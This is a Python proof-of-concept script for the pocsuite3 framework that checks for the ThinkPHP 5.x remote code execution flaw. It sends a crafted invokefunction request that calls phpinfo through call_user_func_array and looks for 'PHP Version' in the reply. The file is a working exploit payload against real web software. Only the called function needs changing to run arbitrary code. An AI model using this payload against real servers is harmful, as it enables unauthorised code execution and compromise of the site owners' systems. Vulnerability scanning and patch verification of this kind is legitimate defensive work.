from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE
from pocsuite3.api import POC_CATEGORY

class TestPOC(POCBase):
    vulID = '99617'
    version = '1.0'
    author = ['seebug']
    vulDate = '2018-12-10'
    createDate = '2024-01-15'
    updateDate = '2024-01-15'
    name = 'ThinkPHP 5.x RCE'
    appName = 'ThinkPHP'
    appVersion = '5.x'
    vulType = 'RCE'
    desc = 'ThinkPHP 5.x Remote Code Execution'

    def _verify(self):
        result = {}
        url = self.url.rstrip('/')
        payload = '/index.php?s=/Index/think/app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
        try:
            response = requests.get(url + payload, timeout=10)
            if 'PHP Version' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                return self.parse_output(result)
        except:
            pass
        return self.parse_output(result)

register_poc(TestPOC)
